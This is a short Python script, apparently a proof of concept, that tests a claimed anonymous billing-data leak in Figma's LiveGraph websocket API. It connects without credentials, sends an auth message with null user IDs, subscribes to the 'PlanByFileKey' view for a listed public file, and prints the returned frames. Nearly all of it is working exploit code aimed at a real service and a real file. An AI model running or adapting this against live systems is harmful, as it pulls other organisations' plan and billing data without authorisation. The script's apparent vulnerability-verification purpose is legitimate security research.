"""批量验证：多个公开文件 → PlanByFileKey 匿名计费数据泄露"""
import sys, json, asyncio
import websockets
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
FILES = {
    "ucha7bf05fJ81CJZVoruo0": "Flowbite-Design-System-Pro",
}

def lg_url(fk):
    return (f"wss://www.figma.com/api/livegraph?pv=1&pr=251c5be83e6853e5&pt=1786072093"
            f"&ph=sb9dUg8LQV0WGY29b-j8nggmhGX8TR2vghWs-rNzbds&userId=&anonUserId="
            f"&clientType=web&commitHash=5848603c50c1ee154ea6a1fe5ee3aab3791c5b48"
            f"&preload=%7B%7D&requestedProtocolVersion=2"
            f"&clientUrl=https%3A%2F%2Fwww.figma.com%2Ffile%2F{fk}"
            f"&connectionType=initial&reconnect=0")

async def sub(label, view_name, args, fk, wait=15):
    frames = []
    try:
        async with websockets.connect(lg_url(fk),
                                      additional_headers={"User-Agent": UA,
                                                          "Origin": "https://www.figma.com"},
                                      max_size=50_000_000, open_timeout=15) as ws:
            await ws.send(json.dumps({"messageType": "auth", "clientType": "web",
                                      "args": {"userId": None, "anonymousUserId": None},
                                      "tags": {"clientType": "web",
                                               "commitHash": "81855c2bc7c604648169c4e4333f43579bfa7464",
                                               "clientUrl": f"https://www.figma.com/file/{fk}"},
                                      "clientRequestedVersion": 2}))
            for _ in range(3):
                msg = await asyncio.wait_for(ws.recv(), timeout=8)
                if isinstance(msg, str) and "authSuccess" in msg:
                    break
            await ws.send(json.dumps({"messageType": "subscribe", "viewName": view_name,
                                      "viewHash": "ab" * 16, "loadType": "initial", "args": args}))
            deadline = asyncio.get_event_loop().time() + wait
            while asyncio.get_event_loop().time() < deadline:
                try:
                    msg = await asyncio.wait_for(ws.recv(), timeout=3)
                    if isinstance(msg, str):
                        frames.append(msg)
                except asyncio.TimeoutError:
                    break
    except Exception as e:
        print(f"[{label}] ❌ {type(e).__name__}: {str(e)[:90]}"); return
    print(f"[{label}] 帧数={len(frames)}")
    for f in frames:
        if '"initial":' in f or 'viewSubscriptionFailed' in f:
            print(f"    🖼 {f[:8000]}")
    if not any(('"initial":' in f) or ('viewSubscriptionFailed' in f) for f in frames):
        for f in frames[:2]:
            print(f"    · {f[:300]}")

async def main():
    for fk, name in FILES.items():
        print(f"\n{'='*60}\n### {name} ({fk})")
        await sub(f"PlanByFileKey→{name}", "PlanByFileKey", {"fileKey": fk}, fk, wait=18)

asyncio.run(main())
